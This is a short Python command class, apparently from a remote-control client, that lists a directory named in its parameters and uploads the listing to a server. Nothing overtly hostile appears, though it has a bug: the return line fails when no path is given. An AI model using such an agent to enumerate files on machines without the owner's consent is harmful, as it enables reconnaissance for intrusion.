import os

from commands.Command import Command
from client import communication as c


class DirList(Command):

    def run(self):
        if "path" in self.params:
            listdir = os.listdir(self.params["path"])
            c.upload_dirlist(self.params["path"], listdir)
        return f'DirList {self.params["path"]}: {listdir}'
